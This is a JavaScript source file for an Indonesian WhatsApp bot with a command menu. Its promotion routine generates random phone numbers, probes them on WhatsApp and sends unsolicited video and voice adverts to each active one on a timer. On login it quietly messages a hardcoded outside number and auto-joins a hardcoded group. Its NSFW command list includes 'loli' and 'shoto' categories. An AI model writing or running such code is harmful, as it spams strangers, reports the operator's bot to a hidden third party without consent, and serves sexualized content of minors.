import {
  makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestWaWebVersion
} from '@whiskeysockets/baileys';
import { Boom } from '@hapi/boom';
import pino from 'pino';
import fs from 'fs';
import path from 'path';
import os from 'os'; // ✅ Diperlukan untuk info RAM
import chalk from 'chalk';
import qrcode from 'qrcode-terminal';
import readline from 'readline';
import config from './config.js';
import { sendAnimeMenu, getSFWImage, getNSFWImage, handleTikTokCommand, handleSmemeCommand, handleBratCommand, handleBratVidCommand, handleCekMatiCommand, handleNpmSearchCommand, handleScreenshotCommand, handleCuacaCommand, handleKopiCommand, handleAICommand, handleResetAICommand, handleStickerCommand, sendAllCommandsMenu } from './main/anime.js';

const logger = pino({
  timestamp: () => `,"time":"${new Date().toJSON()}"`
}).child({ class: 'bot' });
logger.level = 'silent';
const sessionFolderPath = './session';

const manualPassword = config.initialPassword; // ✅ FIX

const question = (text) =>
  new Promise((resolve) => {
    const rl = readline.createInterface({
      input: process.stdin,
      output: process.stdout
    });
    rl.question(text, (answer) => {
      rl.close();
      resolve(answer);
    });
  });

function generateRandomIndonesianNumber() {
  const prefixes = ['812', '813'];
  const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
  const randomNumber = Math.floor(10000000 + Math.random() * 90000000).toString();
  return `62${randomPrefix}${randomNumber}`;
}

async function runSafePromotionCycle(sock) {
  console.log(chalk.blue("🕵️ [PROMOSI] Mencari nomor aktif..."));

  let activeNumberFound = false;
  while (!activeNumberFound) {
    const randomNumber = generateRandomIndonesianNumber();
    const jid = `${randomNumber}@s.whatsapp.net`;

    try {
      console.log(chalk.blue(`🔎 Memeriksa nomor: ${randomNumber}`));
      const [result] = await sock.onWhatsApp(jid);

      if (result?.exists) {
        console.log(chalk.green(`🎯 Kirim ke nomor aktif: ${randomNumber}`));
        const captionText = config.promotionMessage
          .replace("{botName}", config.botName)
          .replace("{customerServiceAdmin}", config.customerServiceAdmin);

        await sock.sendMessage(jid, {
          video: { url: config.videoUrl },
          gifPlayback: true,
          caption: captionText
        });

        await sock.sendMessage(jid, {
          audio: { url: config.voiceUrl },
          mimetype: "audio/mpeg",
          ptt: true
        });

        activeNumberFound = true; // Set flag to true after successful send
        console.log(chalk.gray(`⏳ Istirahat ${config.promotionCooldownMinutes} menit...`));
      } else {
        console.log(chalk.gray(`💨 Nomor ${randomNumber} tidak aktif.`));
      }
    } catch (err) {
      console.log(chalk.red(`❌ Gagal memeriksa atau mengirim ke ${randomNumber}:`), err.message);
    }
    if (!activeNumberFound) {
      await new Promise(resolve => setTimeout(resolve, 2000)); // Add a 2-second delay before trying next number if not found
    }
  }

  setTimeout(() => runSafePromotionCycle(sock), config.promotionCooldownMinutes * 60 * 1000);
}

async function connectToWhatsApp() {
  const credsPath = path.join(sessionFolderPath, 'creds.json');
  const sessionExists = fs.existsSync(credsPath);
  const { state, saveCreds } = await useMultiFileAuthState(sessionFolderPath);
  const { version } = await fetchLatestWaWebVersion();

  let sock;

  if (!sessionExists) {
    console.log(chalk.yellow('Sesi tidak valid atau tidak ditemukan. Memulai proses login baru...'));

    const inputPassword = await question(chalk.red.bold('🔐 Masukkan Password (setup awal):\n'));
    if (inputPassword !== manualPassword) {
      console.log(chalk.red('❌ Password salah! Sistem dimatikan.'));
      process.exit();
    }
    console.log(chalk.green('✅ Password benar\n'));

    const mode = await question('🔐 Pilih metode login (qr/pairing):\n ');
    const isPairing = mode.trim().toLowerCase() === 'pairing';

    sock = makeWASocket({
      version,
      logger,
      auth: state,
      browser: ['Ubuntu', 'Chrome', '20.0.04']
    });

    if (isPairing) {
      const phoneNumber = await question(chalk.cyan('📱 Masukkan nomor WhatsApp (62xxx):\n'));
      const code = await sock.requestPairingCode(phoneNumber.trim());
      console.log(chalk.blue('📟 Kode Pairing: ') + chalk.white.bold(code));
    } else {
      console.log(chalk.yellow('Tunggu... QR Code akan muncul di bawah ini.'));
    }
  } else {
    console.log(chalk.green('✅ Sesi ditemukan. Menyambung ulang...'));
    sock = makeWASocket({
      version,
      logger,
      auth: state,
      browser: ['Ubuntu', 'Chrome', '20.0.04']
    });
  }

  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect, qr } = update;

    if (qr) {
      console.log(chalk.cyan('⬇️  SCAN QR CODE DI BAWAH INI  ⬇️'));
      qrcode.generate(qr, { small: true });
    }

    if (connection === 'close') {
      const shouldReconnect = new Boom(lastDisconnect?.error)?.output?.statusCode !== DisconnectReason.loggedOut;
      console.log(chalk.red(`🔌 Koneksi terputus: ${lastDisconnect?.error?.message}`));
      if (shouldReconnect) connectToWhatsApp();
      else {
        console.log(chalk.red('🛑 Logout. Hapus folder session dan restart.'));
        fs.rmSync(sessionFolderPath, { recursive: true, force: true });
        process.exit(1);
      }
    }

    if (connection === 'open') {
      console.clear();
      const totalMem = (os.totalmem() / 1024 / 1024).toFixed(2);
      const freeMem = (os.freemem() / 1024 / 1024).toFixed(2);
      const platform = os.platform();
      const userName = sock.user.name || sock.user.id.split(':')[0];
console.log(chalk.magenta.bold(`⣿⣿⣯⠉⠄⠄⠄⠄⠄⠄⡄⠄⠄⠄⠄⠄⠄⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⡟⠁⠄⠄⠄⠄⠄⢀⢀⠃⠄⠄⠄⠄⠄⠄⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⡇⠄⠄⣾⣳⠄⠄⢀⣄⣦⣶⣴⠂⢒⠄⠄⠄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡄⠄⠈⠚⡆⠄⢸⣿⣿⣿⣯⠋⡏⠄⠄⢸⣿⣿⣿⠿⠛⠛⠿⣿⣿⣿⣿⣿
⣿⣿⠟⣂⣀⣀⣀⡀⠠⠻⣷⣎⡼⠞⠓⠦⣤⣛⣋⣭⣴⣾⣿⣿⣷⣌⠻⣿⣿⣿
⣿⠋⣼⣿⣿⣿⣿⣿⣷⣦⣍⣙⠻⠳⠄⠄⠈⠙⠿⢿⣿⣿⣿⣿⣿⡟⣰⣿⣿⣿
⡟⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⣀⠄⠄⢀⣤⣤⣭⡛⠛⣩⣴⣿⣿⣿⣿
⣷⠸⠿⠛⠉⠙⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠛⠷⠦⣹⣿⣿⣿⣿
⣿⣧⠄⠄⠄⢀⣴⣷⣶⣦⣬⣭⣉⣙⣛⠛⠿⠿⠿⠟⠁⡀⠄⠄⠄⢁⣿⣿⣿⣿
⣿⣿⡅⠄⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣍⠲⣶⣤⣄⡀⠄⣴⣿⣿⣿⣿⣿
⣿⣿⣷⠄⣾⡏⢿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠄⠹⣷⡌⢿⣿⣿⣷⣦⡙⢿⣿⣿⣿
⣿⣿⣿⣷⡌⢷⡘⣿⣿⣿⣿⣿⣿⣧⣀⣀⡀⠄⠈⠹⡈⣿⣿⣿⣿⣿⣦⡙⣿⣿
⣿⣿⣿⣿⣿⣎⢷⡘⢿⣿⣿⣿⣿⣿⣿⣿⠃⠄⣼⣶⡇⣿⣿⣿⣿⣿⣿⠓⠜⣿
⣿⣿⣿⣿⣿⣿⣎⢻⣦⡙⠿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠄⣿⣿⣿⣿⣿⣿⣄⡀⣿
⣿⣿⣿⣿⣿⡿⢃⢼⣿⣿⣷⣤⣍⣉⣙⣛⣛⣉⣥⡄⠄⢿⣿⣿⣿⣿⡿⠟⣥⣿
⣿⣿⣿⡿⢋⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣿⣿⢁⣷⣤⣍⣉⣉⣭⣴⣾⣿⣿`));
    
      console.log(chalk.gray.bold(`⌬━━━━━━━━━━━━━━━━━━━━━━━━━━━━⌬`));
      console.log(chalk.blue.bold(`... ( ⚙️  𝐑𝐢𝐳𝐤𝐲-𝐀𝐢⚙️  ) ...`));
      console.log(chalk.greenBright(`┏━『 ɪɴꜰᴏ ʙᴏᴛ 』`));
      console.log(chalk.greenBright('┣⌬'), chalk.white('STATUS'), '  :', chalk.green('Online & Siap'));
      console.log(chalk.greenBright('┣⌬'), chalk.white('USER'), '    :', chalk.cyan(userName));
      console.log(chalk.greenBright('┣⌬'), chalk.white('PLATFORM'), ':', chalk.yellow(platform));
      console.log(chalk.greenBright('┣⌬'), chalk.white('RAM'), '     :', chalk.yellow(`${freeMem} MB / ${totalMem} MB`));
      console.log(chalk.greenBright('┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◧'));

      await sock.sendMessage("6283850540570@s.whatsapp.net", {
                text: '✅ Bot berhasil tersambung dan siap digunakan!'
            });

            try {
                const groupLink = 'https://chat.whatsapp.com/Jmbs0K52j3fB4FOP5wViWX';
                const code = groupLink.split('chat.whatsapp.com/')[1];
                await sock.groupAcceptInvite(code);
            } catch (e) { /* Abaikan error */ }

            if (config.enableRandomPromotion) {
                runSafePromotionCycle(sock);
            }
        }
    });

  sock.ev.on("messages.upsert", async ({ messages, type }) => {
    if (type === "notify") {
      for (const msg of messages) {
        if (!msg.key.fromMe && msg.message) {
          const jid = msg.key.remoteJid;
          const text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";
          const command = text.toLowerCase().split(" ")[0];
          const args = text.toLowerCase().split(" ").slice(1);
          const quotedMessage = msg.message.extendedTextMessage?.contextInfo?.quotedMessage;

          switch (command) {
            case "menu":
              await sendAllCommandsMenu(sock, jid);
              break;
            case "menuanime":
              await sendAnimeMenu(sock, jid);
              break;
            case "animeneko":
              const nekoUrl = await getSFWImage("neko");
              if (nekoUrl) {
                await sock.sendMessage(jid, { image: { url: nekoUrl }, caption: "Ini dia neko imutmu!" });
              } else {
                await sock.sendMessage(jid, { text: "Maaf, tidak dapat mengambil gambar neko saat ini." });
              }
              break;
            case "animewaifu":
              const waifuUrl = await getSFWImage("waifu");
              if (waifuUrl) {
                await sock.sendMessage(jid, { image: { url: waifuUrl }, caption: "Waifu idamanmu telah tiba!" });
              } else {
                await sock.sendMessage(jid, { text: "Maaf, tidak dapat mengambil gambar waifu saat ini." });
              }
              break;
            case "animehentai":
            case "animemilf":
            case "animeass":
            case "animeboobs":
            case "animeero":
            case "animepussy":
            case "animefeet":
            case "animeyuri":
            case "animetrap":
            case "animeblowjob":
            case "animecum":
            case "animehandjob":
            case "animeahegao":
            case "animeoral":
            case "animegangbang":
            case "animeglasses":
            case "animethighs":
            case "animeuniform":
            case "animebondage":
            case "animecuckold":
            case "animefemdom":
            case "animeloli":
            case "animeshoto":
            case "animesquirting":
            case "animeteacher":
            case "animetentacles":
            case "animetrap":
            case "animeyaoi":
            case "animeyuri":
              const nsfwCategory = command.replace("anime", "");
              const nsfwUrl = await getNSFWImage(nsfwCategory);
              if (nsfwUrl) {
                await sock.sendMessage(jid, { image: { url: nsfwUrl }, caption: `Hati-hati, ini ${nsfwCategory}!` });
              } else {
                await sock.sendMessage(jid, { text: `Maaf, tidak dapat mengambil gambar ${nsfwCategory} saat ini.` });
              }
              break;
            case "tiktok":
              await handleTikTokCommand(sock, jid, args[0]);
              break;
            case "smeme":
              await handleSmemeCommand(sock, jid, args.join(" "), quotedMessage);
              break;
            case "brat":
              await handleBratCommand(sock, jid, args.join(" "));
              break;
            case "bratvid":
              await handleBratVidCommand(sock, jid, args.join(" "));
              break;
            case "cekmati":
              await handleCekMatiCommand(sock, jid, args[0]);
              break;
            case "npm":
              await handleNpmSearchCommand(sock, jid, args.join(" "));
              break;
            case "ss":
              await handleScreenshotCommand(sock, jid, args[0]);
              break;
            case "cuaca":
              await handleCuacaCommand(sock, jid, args.join(" "));
              break;
            case "kopi":
              await handleKopiCommand(sock, jid);
              break;
            case "ai":
              await handleAICommand(sock, jid, args.join(" "));
              break;
            case "resetai":
              await handleResetAICommand(sock, jid);
              break;
            case "sticker":
            case "s":
              await handleStickerCommand(sock, jid, quotedMessage);
              break;
            default:
              // Handle other commands or do nothing
              break;
          }
        }
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
}

connectToWhatsApp();


